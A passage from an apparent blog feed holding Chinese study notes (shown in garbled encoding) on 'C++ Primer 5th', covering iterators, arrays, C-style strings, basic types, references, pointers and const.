ä¸èƒ½æ”¹å˜ã€‚</li><li><strong>ç®­å¤´è¿ç®—ç¬¦</strong>ï¼š è§£å¼•ç”¨ + æˆå‘˜è®¿é—®ï¼Œ<code>it-&gt;mem</code>ç­‰ä»·äº <code>(*it).mem</code></li><li><strong>è°¨è®°</strong>ï¼šä½†å‡¡æ˜¯ä½¿ç”¨äº†<strong>è¿­ä»£å™¨</strong>çš„å¾ªç¯ä½“ï¼Œéƒ½<strong>ä¸è¦</strong>å‘è¿­ä»£å™¨æ‰€å±çš„å®¹å™¨<strong>æ·»åŠ å…ƒç´ </strong>ã€‚</li></ul><p>æ ‡å‡†å®¹å™¨è¿­ä»£å™¨çš„è¿ç®—ç¬¦:</p><table><thead><tr><th>è¿ç®—ç¬¦</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>*iter</code></td><td>è¿”å›è¿­ä»£å™¨<code>iter</code>æ‰€æŒ‡å‘çš„<strong>å…ƒç´ çš„å¼•ç”¨</strong></td></tr><tr><td><code>iter-&gt;mem</code></td><td>ç­‰ä»·äº<code>(*iter).mem</code></td></tr><tr><td><code>++iter</code></td><td>ä»¤<code>iter</code>æŒ‡ç¤ºå®¹å™¨ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ </td></tr><tr><td><code>--iter</code></td><td>ä»¤<code>iter</code>æŒ‡ç¤ºå®¹å™¨ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ </td></tr><tr><td><code>iter1 == iter2</code></td><td>åˆ¤æ–­ä¸¤ä¸ªè¿­ä»£å™¨æ˜¯å¦ç›¸ç­‰</td></tr></tbody></table><h3 id="è¿­ä»£å™¨è¿ç®—">è¿­ä»£å™¨è¿ç®—</h3><p><code>vector</code>å’Œ<code>string</code>è¿­ä»£å™¨æ”¯æŒçš„è¿ç®—ï¼š</p><table><thead><tr><th>è¿ç®—ç¬¦</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>iter + n</code></td><td>è¿­ä»£å™¨åŠ ä¸Šä¸€ä¸ªæ•´æ•°å€¼ä»å¾—åˆ°ä¸€ä¸ªè¿­ä»£å™¨ï¼Œè¿­ä»£å™¨æŒ‡ç¤ºçš„æ–°ä½ç½®å’ŒåŸæ¥ç›¸æ¯”å‘å‰ç§»åŠ¨äº†è‹¥å¹²ä¸ªå…ƒç´ ã€‚ç»“æœè¿­ä»£å™¨æˆ–è€…æŒ‡ç¤ºå®¹å™¨å†…çš„ä¸€ä¸ªå…ƒç´ ï¼Œæˆ–è€…æŒ‡ç¤ºå®¹å™¨å°¾å…ƒç´ çš„ä¸‹ä¸€ä½ç½®ã€‚</td></tr><tr><td><code>iter - n</code></td><td>è¿­ä»£å™¨å‡å»ä¸€ä¸ªæ•´æ•°ä»å¾—åˆ°ä¸€ä¸ªè¿­ä»£å™¨ï¼Œè¿­ä»£å™¨æŒ‡ç¤ºçš„æ–°ä½ç½®æ¯”åŸæ¥å‘åç§»åŠ¨äº†è‹¥å¹²ä¸ªå…ƒç´ ã€‚ç»“æœè¿­ä»£å™¨æˆ–è€…æŒ‡å‘å®¹å™¨å†…çš„ä¸€ä¸ªå…ƒç´ ï¼Œæˆ–è€…æŒ‡ç¤ºå®¹å™¨å°¾å…ƒç´ çš„ä¸‹ä¸€ä½ç½®ã€‚</td></tr><tr><td><code>iter1 += n</code></td><td>è¿­ä»£å™¨åŠ æ³•çš„å¤åˆèµ‹å€¼è¯­å¥ï¼Œå°†<code>iter1</code>åŠ nçš„ç»“æœèµ‹ç»™<code>iter1</code></td></tr><tr><td><code>iter1 -= n</code></td><td>è¿­ä»£å™¨å‡æ³•çš„å¤åˆèµ‹å€¼è¯­å¥ï¼Œå°†<code>iter2</code>å‡nçš„åŠ è¿‡èµ‹ç»™<code>iter1</code></td></tr><tr><td><code>iter1 - iter2</code></td><td>ä¸¤ä¸ªè¿­ä»£å™¨ç›¸å‡çš„ç»“æœæ˜¯å®ƒä»¬ä¹‹é—´çš„è·ç¦»ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå°†è¿ç®—ç¬¦å³ä¾§çš„è¿­ä»£å™¨å‘å‰ç§»åŠ¨å·®å€¼ä¸ªå…ƒç´ åå¾—åˆ°å·¦ä¾§çš„è¿­ä»£å™¨ã€‚å‚ä¸è¿ç®—çš„ä¸¤ä¸ªè¿­ä»£å™¨å¿…é¡»æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªå®¹å™¨ä¸­çš„å…ƒç´ æˆ–è€…å°¾å…ƒç´ çš„ä¸‹ä¸€ä½ç½®ã€‚</td></tr><tr><td><code>&gt;</code>ã€<code>&gt;=</code>ã€<code>&lt;</code>ã€<code>&lt;=</code></td><td>è¿­ä»£å™¨çš„å…³ç³»è¿ç®—ç¬¦ï¼Œå¦‚æœæŸè¿­ä»£å™¨</td></tr></tbody></table><ul><li><strong>difference_type</strong>ï¼šä¿è¯è¶³å¤Ÿå¤§ä»¥å­˜å‚¨ä»»ä½•ä¸¤ä¸ªè¿­ä»£å™¨å¯¹è±¡é—´çš„è·ç¦»ï¼Œå¯æ­£å¯è´Ÿã€‚</li></ul><h2 id="æ•°ç»„">æ•°ç»„</h2><ul><li>ç›¸å½“äºvectorçš„ä½çº§ç‰ˆï¼Œ<strong>é•¿åº¦å›ºå®š</strong>ã€‚</li></ul><h3 id="å®šä¹‰å’Œåˆå§‹åŒ–å†…ç½®æ•°ç»„">å®šä¹‰å’Œåˆå§‹åŒ–å†…ç½®æ•°ç»„</h3><ul><li>åˆå§‹åŒ–ï¼š<code>char input_buffer[buffer_size];</code>ï¼Œé•¿åº¦å¿…é¡»æ˜¯constè¡¨è¾¾å¼ï¼Œæˆ–è€…ä¸å†™ï¼Œè®©ç¼–è¯‘å™¨è‡ªå·±æ¨æ–­ã€‚</li><li>æ•°ç»„ä¸å…è®¸ç›´æ¥èµ‹å€¼ç»™å¦ä¸€ä¸ªæ•°ç»„ã€‚</li></ul><h3 id="è®¿é—®æ•°ç»„å…ƒç´ ">è®¿é—®æ•°ç»„å…ƒç´ </h3><ul><li>æ•°ç»„ä¸‹æ ‡çš„ç±»å‹ï¼š<code>size_t</code> ã€‚</li><li>å­—ç¬¦æ•°ç»„çš„ç‰¹æ®Šæ€§ï¼šç»“å°¾å¤„æœ‰ä¸€ä¸ªç©ºå­—ç¬¦ï¼Œå¦‚ <code>char a[] = &quot;hello&quot;;</code> ã€‚</li><li>ç”¨æ•°ç»„åˆå§‹åŒ– <code>vector</code>ï¼š <code>int a[] = &#123;1,2,3,4,5&#125;; vector&lt;int&gt; v(begin(a), end(a));</code> ã€‚</li></ul><h3 id="æ•°ç»„å’ŒæŒ‡é’ˆ">æ•°ç»„å’ŒæŒ‡é’ˆ</h3><ul><li>ä½¿ç”¨æ•°ç»„æ—¶ï¼Œç¼–è¯‘å™¨ä¸€èˆ¬ä¼šæŠŠå®ƒè½¬æ¢æˆæŒ‡é’ˆã€‚</li><li>æ ‡å‡†åº“ç±»å‹é™å®šä½¿ç”¨çš„ä¸‹æ ‡å¿…é¡»æ˜¯æ— ç¬¦å·ç±»å‹ï¼Œè€Œå†…ç½®çš„ä¸‹æ ‡å¯ä»¥å¤„ç†è´Ÿå€¼ã€‚</li><li><strong>æŒ‡é’ˆè®¿é—®æ•°ç»„</strong>ï¼šåœ¨è¡¨è¾¾å¼ä¸­ä½¿ç”¨æ•°ç»„åæ—¶ï¼Œåå­—ä¼šè‡ªåŠ¨è½¬æ¢æˆæŒ‡å‘æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆã€‚</li></ul><h2 id="Cé£æ ¼å­—ç¬¦ä¸²">Cé£æ ¼å­—ç¬¦ä¸²</h2><ul><li>ä»Cç»§æ‰¿æ¥çš„å­—ç¬¦ä¸²ã€‚</li><li>ç”¨ç©ºå­—ç¬¦ç»“æŸï¼ˆ<code>\0</code>ï¼‰ã€‚</li><li>å¯¹å¤§å¤šæ•°åº”ç”¨æ¥è¯´ï¼Œä½¿ç”¨æ ‡å‡†åº“ <code>string</code>æ¯”ä½¿ç”¨Cé£æ ¼å­—ç¬¦ä¸²æ›´å®‰å…¨ã€æ›´é«˜æ•ˆã€‚</li><li>è·å– <code>string</code> ä¸­çš„ <code>cstring</code> ï¼š <code>const char *str = s.c_str();</code> ã€‚</li></ul><p>Cæ ‡å‡†åº“Stringå‡½æ•°ï¼Œå®šä¹‰åœ¨<code>&lt;cstring&gt;</code> ä¸­ï¼š</p><table><thead><tr><th>å‡½æ•°</th><th>ä»‹ç»</th></tr></thead><tbody><tr><td><code>strlen(p)</code></td><td>è¿”å›<code>p</code>çš„é•¿åº¦ï¼Œç©ºå­—ç¬¦ä¸è®¡ç®—åœ¨å†…</td></tr><tr><td><code>strcmp(p1, p2)</code></td><td>æ¯”è¾ƒ<code>p1</code>å’Œ<code>p2</code>çš„ç›¸ç­‰æ€§ã€‚å¦‚æœ<code>p1==p2</code>ï¼Œè¿”å›0ï¼›å¦‚æœ<code>p1&gt;p2</code>ï¼Œè¿”å›ä¸€ä¸ªæ­£å€¼ï¼›å¦‚æœ<code>p1&lt;p2</code>ï¼Œè¿”å›ä¸€ä¸ªè´Ÿå€¼ã€‚</td></tr><tr><td><code>strcat(p1, p2)</code></td><td>å°†<code>p2</code>é™„åŠ åˆ°<code>p1</code>ä¹‹åï¼Œè¿”å›<code>p1</code></td></tr><tr><td><code>strcpy(p1, p2)</code></td><td>å°†<code>p2</code>æ‹·è´ç»™<code>p1</code>ï¼Œè¿”å›<code>p1</code></td></tr></tbody></table><p><strong>å°½é‡ä½¿ç”¨vectorå’Œè¿­ä»£å™¨ï¼Œå°‘ç”¨æ•°ç»„</strong></p><h2 id="å¤šç»´æ•°ç»„">å¤šç»´æ•°ç»„</h2><ul><li><strong>å¤šç»´æ•°ç»„çš„åˆå§‹åŒ–</strong>ï¼š `int ia[3][4] =</li></ul>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> ã€ŠC++ Primer 5thã€‹ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬2ç«  å˜é‡å’ŒåŸºæœ¬ç±»å‹</title>
      <link href="/2023/05/05/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch02/"/>
      <url>/2023/05/05/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch02/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬2ç« -å˜é‡å’ŒåŸºæœ¬ç±»å‹">ç¬¬2ç«  å˜é‡å’ŒåŸºæœ¬ç±»å‹</h1><p>[toc]</p><p>ä»»ä½•å¸¸ç”¨çš„ç¼–ç¨‹è¯­è¨€éƒ½å…·å¤‡ä¸€ç»„å…¬å…±çš„è¯­æ³•ç‰¹å¾ï¼Œæœ€åŸºæœ¬çš„ç‰¹å¾åŒ…æ‹¬ï¼š</p><ul><li>æ•´å‹ã€å­—ç¬¦å‹ç­‰å†…ç½®ç±»å‹</li><li>å˜é‡ï¼Œç”¨æ¥ä¸ºå¯¹è±¡å‘½å</li><li>è¡¨è¾¾å¼å’Œè¯­å¥ï¼Œç”¨äºæ“ä½œä¸Šè¿°æ•°æ®ç±»å‹çš„å…·ä½“å€¼</li><li>if æˆ– while ç­‰æ§åˆ¶ç»“æ„ï¼Œæœ‰é€‰æ‹©åœ°æ‰§è¡Œä¸€äº›è¯­å¥æˆ–é‡å¤åœ°æ‰§è¡Œä¸€äº›è¯­å¥</li><li>å‡½æ•°ï¼Œç”¨äºå®šä¹‰å¯ä¾›éšæ—¶è°ƒç”¨çš„è®¡ç®—å•å…ƒ</li></ul><p>å¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€é€šè¿‡ä¸¤ç§æ–¹å¼æ¥è¿›ä¸€æ­¥è¡¥å……å…¶åŸºæœ¬ç‰¹å¾ï¼š</p><ul><li>è‡ªå®šä¹‰æ•°æ®ç±»å‹ï¼Œå®ç°å¯¹è¯­è¨€çš„æ‰©å±•</li><li>å°†ä¸€äº›æœ‰ç”¨çš„åŠŸèƒ½å°è£…æˆåº“å‡½æ•°</li></ul><h3 id="åŸºæœ¬å†…ç½®ç±»å‹">åŸºæœ¬å†…ç½®ç±»å‹</h3><p><strong>åŸºæœ¬ç®—æ•°ç±»å‹</strong>ï¼š</p><table><thead><tr><th>ç±»å‹</th><th>å«ä¹‰</th><th>æœ€å°å°ºå¯¸</th></tr></thead><tbody><tr><td><code>bool</code></td><td>å¸ƒå°”ç±»å‹</td><td>8bits</td></tr><tr><td><code>char</code></td><td>å­—ç¬¦</td><td>8bits</td></tr><tr><td><code>wchar_t</code></td><td>å®½å­—ç¬¦</td><td>16bits</td></tr><tr><td><code>char16_t</code></td><td>Unicodeå­—ç¬¦</td><td>16bits</td></tr><tr><td><code>char32_t</code></td><td>Unicodeå­—ç¬¦</td><td>32bits</td></tr><tr><td><code>short</code></td><td>çŸ­æ•´å‹</td><td>16bits</td></tr><tr><td><code>int</code></td><td>æ•´å‹</td><td>16bits (åœ¨32ä½æœºå™¨ä¸­æ˜¯32bits)</td></tr><tr><td><code>long</code></td><td>é•¿æ•´å‹</td><td>32bits</td></tr><tr><td><code>long long</code></td><td>é•¿æ•´å‹</td><td>64bits ï¼ˆæ˜¯åœ¨C++11ä¸­æ–°å®šä¹‰çš„ï¼‰</td></tr><tr><td><code>float</code></td><td>å•ç²¾åº¦æµ®ç‚¹æ•°</td><td>6ä½æœ‰æ•ˆæ•°å­—</td></tr><tr><td><code>double</code></td><td>åŒç²¾åº¦æµ®ç‚¹æ•°</td><td>10ä½æœ‰æ•ˆæ•°å­—</td></tr><tr><td><code>long double</code></td><td>æ‰©å±•ç²¾åº¦æµ®ç‚¹æ•°</td><td>10ä½æœ‰æ•ˆæ•°å­—</td></tr></tbody></table><h3 id="å¦‚ä½•é€‰æ‹©ç±»å‹">å¦‚ä½•é€‰æ‹©ç±»å‹</h3><ul><li>1.å½“æ˜ç¡®çŸ¥æ™“æ•°å€¼ä¸å¯èƒ½æ˜¯è´Ÿæ•°æ—¶ï¼Œé€‰ç”¨æ— ç¬¦å·ç±»å‹ï¼›</li><li>2.ä½¿ç”¨<code>int</code>æ‰§è¡Œæ•´æ•°è¿ç®—ã€‚ä¸€èˆ¬<code>long</code>çš„å¤§å°å’Œ<code>int</code>ä¸€æ ·ï¼Œè€Œ<code>short</code>å¸¸å¸¸æ˜¾å¾—å¤ªå°ã€‚é™¤éè¶…è¿‡äº†<code>int</code>çš„èŒƒå›´ï¼Œé€‰æ‹©<code>long long</code>ã€‚</li><li>3.ç®—æœ¯è¡¨è¾¾å¼ä¸­ä¸è¦ä½¿ç”¨<code>char</code>æˆ–<code>bool</code>ã€‚</li><li>4.æµ®ç‚¹è¿ç®—é€‰ç”¨<code>double</code>ã€‚</li></ul><h3 id="ç±»å‹è½¬æ¢">ç±»å‹è½¬æ¢</h3><ul><li>éå¸ƒå°”å‹èµ‹ç»™å¸ƒå°”å‹ï¼Œåˆå§‹å€¼ä¸º0åˆ™ç»“æœä¸ºfalseï¼Œå¦åˆ™ä¸ºtrueã€‚</li><li>å¸ƒå°”å‹èµ‹ç»™éå¸ƒå°”å‹ï¼Œåˆå§‹å€¼ä¸ºfalseç»“æœä¸º0ï¼Œåˆå§‹å€¼ä¸ºtrueç»“æœä¸º1ã€‚</li></ul><h3 id="å­—é¢å€¼å¸¸é‡">å­—é¢å€¼å¸¸é‡</h3><ul><li>ä¸€ä¸ªå½¢å¦‚<code>42</code>çš„å€¼è¢«ç§°ä½œ<strong>å­—é¢å€¼å¸¸é‡</strong>ï¼ˆliteralï¼‰ã€‚<ul><li>æ•´å‹å’Œæµ®ç‚¹å‹å­—é¢å€¼ã€‚</li><li>å­—ç¬¦å’Œå­—ç¬¦ä¸²å­—é¢å€¼ã€‚<ul><li>ä½¿ç”¨ç©ºæ ¼è¿æ¥ï¼Œç»§æ‰¿è‡ªCã€‚</li><li>å­—ç¬¦å­—é¢å€¼ï¼šå•å¼•å·ï¼Œ <code>'a'</code></li><li>å­—ç¬¦ä¸²å­—é¢å€¼ï¼šåŒå¼•å·ï¼Œ <code>&quot;Hello World&quot;</code></li><li>åˆ†å¤šè¡Œä¹¦å†™å­—ç¬¦ä¸²ã€‚<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std:cout&lt;&lt;<span class="string">&quot;wow, a really, really long string&quot;</span></span><br><span class="line">          <span class="string">&quot;literal that spans two lines&quot;</span> &lt;&lt;std::endl;</span><br></pre></td></tr></table></figure></li></ul></li><li>è½¬ä¹‰åºåˆ—ã€‚<code>\n</code>ã€<code>\t</code>ç­‰ã€‚</li><li>å¸ƒå°”å­—é¢å€¼ã€‚<code>true</code>ï¼Œ<code>false</code>ã€‚</li><li>æŒ‡é’ˆå­—é¢å€¼ã€‚<code>nullptr</code></li></ul></li></ul><blockquote><p>å­—ç¬¦ä¸²å‹å®é™…ä¸Šæ—¶å¸¸é‡å­—ç¬¦æ„æˆçš„æ•°ç»„ï¼Œç»“å°¾å¤„ä»¥<code>'\0'</code>ç»“æŸï¼Œæ‰€ä»¥å­—ç¬¦ä¸²ç±»å‹å®é™…ä¸Šé•¿åº¦æ¯”å†…å®¹å¤š1ã€‚</p></blockquote><h2 id="å˜é‡">å˜é‡</h2><p><strong>å˜é‡</strong>æä¾›ä¸€ä¸ª<strong>å…·å</strong>çš„ã€å¯ä¾›ç¨‹åºæ“ä½œçš„å­˜å‚¨ç©ºé—´ã€‚   <code>C++</code>ä¸­<strong>å˜é‡</strong>å’Œ<strong>å¯¹è±¡</strong>ä¸€èˆ¬å¯ä»¥äº’æ¢ä½¿ç”¨ã€‚</p><h3 id="å˜é‡å®šä¹‰ï¼ˆdefineï¼‰">å˜é‡å®šä¹‰ï¼ˆdefineï¼‰</h3><ul><li><strong>å®šä¹‰å½¢å¼</strong>ï¼šç±»å‹è¯´æ˜ç¬¦ï¼ˆtype specifierï¼‰ + ä¸€ä¸ªæˆ–å¤šä¸ªå˜é‡åç»„æˆçš„åˆ—è¡¨ã€‚å¦‚<code>int sum = 0, value, units_sold = 0;</code></li><li><strong>åˆå§‹åŒ–</strong>ï¼ˆinitializeï¼‰ï¼šå¯¹è±¡åœ¨åˆ›å»ºæ—¶è·å¾—äº†ä¸€ä¸ªç‰¹å®šçš„å€¼ã€‚<ul><li><strong>åˆå§‹åŒ–ä¸æ˜¯èµ‹å€¼ï¼</strong>ï¼š</li><li>åˆå§‹åŒ– = åˆ›å»ºå˜é‡ + èµ‹äºˆåˆå§‹å€¼</li><li>èµ‹å€¼ = æ“¦é™¤å¯¹è±¡çš„å½“å‰å€¼ + ç”¨æ–°å€¼ä»£æ›¿</li><li><strong>åˆ—è¡¨åˆå§‹åŒ–</strong>ï¼šä½¿ç”¨èŠ±æ‹¬å·<code>&#123;&#125;</code>ï¼Œå¦‚<code>int units_sold&#123;0&#125;;</code></li><li>é»˜è®¤åˆå§‹åŒ–ï¼šå®šä¹‰æ—¶æ²¡æœ‰æŒ‡å®šåˆå§‹å€¼ä¼šè¢«é»˜è®¤åˆå§‹åŒ–ï¼›<strong>åœ¨å‡½æ•°ä½“å†…éƒ¨çš„å†…ç½®ç±»å‹å˜é‡å°†ä¸ä¼šè¢«åˆå§‹åŒ–</strong>ã€‚</li><li>å»ºè®®åˆå§‹åŒ–æ¯ä¸€ä¸ªå†…ç½®ç±»å‹çš„å˜é‡ã€‚</li></ul></li></ul><h3 id="å˜é‡çš„å£°æ˜ï¼ˆdeclarationï¼‰-vs-å®šä¹‰ï¼ˆdefineï¼‰">å˜é‡çš„<strong>å£°æ˜</strong>ï¼ˆdeclarationï¼‰ vs <strong>å®šä¹‰</strong>ï¼ˆdefineï¼‰</h3><ul><li>ä¸ºäº†æ”¯æŒåˆ†ç¦»å¼ç¼–è¯‘ï¼Œ<code>C++</code>å°†å£°æ˜å’Œå®šä¹‰åŒºåˆ†å¼€ã€‚<strong>å£°æ˜</strong>ä½¿å¾—åå­—ä¸ºç¨‹åºæ‰€çŸ¥ã€‚<strong>å®šä¹‰</strong>è´Ÿè´£åˆ›å»ºä¸åå­—å…³è”çš„å®ä½“ã€‚</li><li><strong>extern</strong>ï¼šåªæ˜¯è¯´æ˜å˜é‡å®šä¹‰åœ¨å…¶ä»–åœ°æ–¹ã€‚</li><li>åªå£°æ˜è€Œä¸å®šä¹‰ï¼š åœ¨å˜é‡åå‰æ·»åŠ å…³é”®å­— <code>extern</code>ï¼Œå¦‚<code>extern int i;</code>ã€‚ä½†å¦‚æœåŒ…å«äº†åˆå§‹å€¼ï¼Œå°±å˜æˆäº†å®šä¹‰ï¼š<code>extern double pi = 3.14;</code></li><li>å˜é‡åªèƒ½è¢«å®šä¹‰ä¸€æ¬¡ï¼Œä½†æ˜¯å¯ä»¥å¤šæ¬¡å£°æ˜ã€‚å®šä¹‰åªå‡ºç°åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå…¶ä»–æ–‡ä»¶ä½¿ç”¨è¯¥å˜é‡æ—¶éœ€è¦å¯¹å…¶å£°æ˜ã€‚</li><li>åå­—çš„<strong>ä½œç”¨åŸŸ</strong>ï¼ˆnamescopeï¼‰<code>&#123;&#125;</code><ul><li><strong>ç¬¬ä¸€æ¬¡ä½¿ç”¨å˜é‡æ—¶å†å®šä¹‰å®ƒ</strong>ã€‚</li><li>åµŒå¥—çš„ä½œç”¨åŸŸ<ul><li>åŒæ—¶å­˜åœ¨å…¨å±€å’Œå±€éƒ¨å˜é‡æ—¶ï¼Œå·²å®šä¹‰å±€éƒ¨å˜é‡çš„ä½œç”¨åŸŸä¸­å¯ç”¨<code>::reused</code>æ˜¾å¼è®¿é—®å…¨å±€å˜é‡reusedã€‚</li><li><strong>ä½†æ˜¯ç”¨åˆ°å…¨å±€å˜é‡æ—¶ï¼Œå°½é‡ä¸é€‚ç”¨é‡åçš„å±€éƒ¨å˜é‡ã€‚</strong></li></ul></li></ul></li></ul><h4 id="å˜é‡å‘½åè§„èŒƒ">å˜é‡å‘½åè§„èŒƒ</h4><ol><li>éœ€ä½“ç°å®é™…æ„ä¹‰</li><li>å˜é‡åç”¨å°å†™å­—æ¯</li><li>è‡ªå®šä¹‰ç±»åç”¨å¤§å†™å­—æ¯å¼€å¤´ï¼šSales_item</li><li>æ ‡è¯†ç¬¦ç”±å¤šä¸ªå•è¯ç»„æˆï¼Œä¸­é—´é¡»æœ‰æ˜ç¡®åŒºåˆ†ï¼šstudent_loanæˆ–studentLoanï¼Œä¸è¦ç”¨studentloanã€‚</li></ol><h2 id="å·¦å€¼å’Œå³å€¼">å·¦å€¼å’Œå³å€¼</h2><ul><li><strong>å·¦å€¼</strong>ï¼ˆl-valueï¼‰<strong>å¯ä»¥</strong>å‡ºç°åœ¨èµ‹å€¼è¯­å¥çš„å·¦è¾¹æˆ–è€…å³è¾¹ï¼Œæ¯”å¦‚å˜é‡ï¼›</li><li><strong>å³å€¼</strong>ï¼ˆr-valueï¼‰<strong>åªèƒ½</strong>å‡ºç°åœ¨èµ‹å€¼è¯­å¥çš„å³è¾¹ï¼Œæ¯”å¦‚å¸¸é‡ã€‚</li></ul><h2 id="å¤åˆç±»å‹">å¤åˆç±»å‹</h2><h3 id="å¼•ç”¨">å¼•ç”¨</h3><blockquote><p>ä¸€èˆ¬è¯´çš„å¼•ç”¨æ˜¯æŒ‡çš„å·¦å€¼å¼•ç”¨</p></blockquote><ul><li><strong>å¼•ç”¨</strong>ï¼šå¼•ç”¨æ˜¯ä¸€ä¸ªå¯¹è±¡çš„åˆ«åï¼Œå¼•ç”¨ç±»å‹å¼•ç”¨ï¼ˆrefer toï¼‰å¦å¤–ä¸€ç§ç±»å‹ã€‚å¦‚<code>int &amp;refVal = val;</code>ã€‚</li><li>å¼•ç”¨å¿…é¡»åˆå§‹åŒ–ã€‚</li><li>å¼•ç”¨å’Œå®ƒçš„åˆå§‹å€¼æ˜¯<strong>ç»‘å®šbind</strong>åœ¨ä¸€èµ·çš„ï¼Œè€Œ<strong>ä¸æ˜¯æ‹·è´</strong>ã€‚ä¸€æ—¦å®šä¹‰å°±ä¸èƒ½æ›´æ”¹ç»‘å®šä¸ºå…¶ä»–çš„å¯¹è±¡</li></ul><h3 id="æŒ‡é’ˆ">æŒ‡é’ˆ</h3><blockquote><p>int *p;      //<strong>æŒ‡å‘intå‹å¯¹è±¡</strong>çš„æŒ‡é’ˆ</p></blockquote><ul><li><p>æ˜¯ä¸€ç§ <code>&quot;æŒ‡å‘ï¼ˆpoint toï¼‰&quot;</code>å¦å¤–ä¸€ç§ç±»å‹çš„å¤åˆç±»å‹ã€‚</p></li><li><p><strong>å®šä¹‰</strong>æŒ‡é’ˆç±»å‹ï¼š <code>int *ip1;</code>ï¼Œ<strong>ä»å³å‘å·¦è¯»æœ‰åŠ©äºé˜…è¯»</strong>ï¼Œ<code>ip1</code>æ˜¯æŒ‡å‘<code>int</code>ç±»å‹çš„æŒ‡é’ˆã€‚</p></li><li><p>æŒ‡é’ˆå­˜æ”¾æŸä¸ªå¯¹è±¡çš„<strong>åœ°å€</strong>ã€‚</p></li><li><p>è·å–å¯¹è±¡çš„åœ°å€ï¼š <code>int i=42; int *p = &amp;i;</code>ã€‚ <code>&amp;</code>æ˜¯<strong>å–åœ°å€ç¬¦</strong>ã€‚</p></li><li><p>æŒ‡é’ˆçš„ç±»å‹ä¸æ‰€æŒ‡å‘çš„å¯¹è±¡ç±»å‹å¿…é¡»ä¸€è‡´ï¼ˆå‡ä¸ºåŒä¸€ç±»å‹intã€doubleç­‰ï¼‰</p></li><li><p>æŒ‡é’ˆçš„å€¼çš„å››ç§çŠ¶æ€ï¼š</p><ul><li>1.æŒ‡å‘ä¸€ä¸ªå¯¹è±¡ï¼›</li><li>2.æŒ‡å‘ç´§é‚»å¯¹è±¡çš„ä¸‹ä¸€ä¸ªä½ç½®ï¼›</li><li>3.ç©ºæŒ‡é’ˆï¼›</li><li>4.æ— æ•ˆæŒ‡é’ˆã€‚</li><li><blockquote><p><strong>å¯¹æ— æ•ˆæŒ‡é’ˆçš„æ“ä½œå‡ä¼šå¼•å‘é”™è¯¯ï¼Œç¬¬äºŒç§å’Œç¬¬ä¸‰ç§è™½ä¸ºæœ‰æ•ˆçš„ï¼Œä½†ç†è®ºä¸Šæ˜¯ä¸è¢«å…è®¸çš„</strong></p></blockquote></li></ul></li><li><p>æŒ‡é’ˆè®¿é—®å¯¹è±¡ï¼š <code>cout &lt;&lt; *p;</code>è¾“å‡ºpæŒ‡é’ˆæ‰€æŒ‡å¯¹è±¡çš„æ•°æ®ï¼Œ <code>*</code>æ˜¯<strong>è§£å¼•ç”¨ç¬¦</strong>ã€‚</p></li><li><p>ç©ºæŒ‡é’ˆä¸æŒ‡å‘ä»»ä½•å¯¹è±¡ã€‚ä½¿ç”¨<code>int *p=nullptr;</code>æ¥ä½¿ç”¨ç©ºæŒ‡é’ˆã€‚</p></li><li><blockquote><p>æŒ‡é’ˆå’Œå¼•ç”¨çš„åŒºåˆ«ï¼šå¼•ç”¨æœ¬èº«å¹¶éä¸€ä¸ªå¯¹è±¡ï¼Œå¼•ç”¨å®šä¹‰åå°±ä¸èƒ½ç»‘å®šåˆ°å…¶ä»–çš„å¯¹è±¡äº†ï¼›æŒ‡é’ˆå¹¶æ²¡æœ‰æ­¤é™åˆ¶ï¼Œç›¸å½“äºå˜é‡ä¸€æ ·ä½¿ç”¨ã€‚</p></blockquote></li><li><blockquote><p>èµ‹å€¼è¯­å¥æ°¸è¿œæ”¹å˜çš„æ˜¯<strong>å·¦ä¾§</strong>çš„å¯¹è±¡ã€‚</p></blockquote></li><li><p><code>void*</code>æŒ‡é’ˆå¯ä»¥å­˜æ”¾<strong>ä»»æ„</strong>å¯¹è±¡çš„åœ°å€ã€‚å› æ— ç±»å‹ï¼Œä»…æ“ä½œå†…å­˜ç©ºé—´ï¼Œå¯¹æ‰€å­˜å¯¹è±¡æ— æ³•è®¿é—®ã€‚</p></li><li><p>å…¶ä»–æŒ‡é’ˆç±»å‹å¿…é¡»è¦ä¸æ‰€æŒ‡å¯¹è±¡<strong>ä¸¥æ ¼åŒ¹é…</strong>ã€‚</p></li><li><p>ä¸¤ä¸ªæŒ‡é’ˆç›¸å‡çš„ç±»å‹æ˜¯<code>ptrdiff_t</code>ã€‚</p></li><li><p>å»ºè®®ï¼šåˆå§‹åŒ–æ‰€æœ‰æŒ‡é’ˆã€‚</p></li><li><p><code>int* p1, p2;//*æ˜¯å¯¹p1çš„ä¿®é¥°ï¼Œæ‰€ä»¥p2è¿˜æ˜¯intå‹</code></p></li></ul><h2 id="consté™å®šç¬¦">consté™å®šç¬¦</h2><ul><li>åŠ¨æœºï¼šå¸Œæœ›å®šä¹‰ä¸€äº›ä¸èƒ½è¢«æ”¹å˜å€¼çš„å˜é‡ã€‚</li></ul><h3 id="åˆå§‹åŒ–å’Œconst">åˆå§‹åŒ–å’Œconst</h3><ul><li>constå¯¹è±¡<strong>å¿…é¡»åˆå§‹åŒ–</strong>ï¼Œä¸”<strong>ä¸èƒ½è¢«æ”¹å˜</strong>ã€‚</li><li>constå˜é‡é»˜è®¤ä¸èƒ½è¢«å…¶ä»–æ–‡ä»¶è®¿é—®ï¼Œéè¦è®¿é—®ï¼Œå¿…é¡»åœ¨æŒ‡å®šconstå®šä¹‰ä¹‹å‰åŠ externã€‚è¦æƒ³åœ¨å¤šä¸ªæ–‡ä»¶ä¸­ä½¿ç”¨constå˜é‡å…±äº«ï¼Œå®šä¹‰å’Œå£°æ˜éƒ½åŠ constå…³é”®å­—å³å¯ã€‚</li></ul><h3 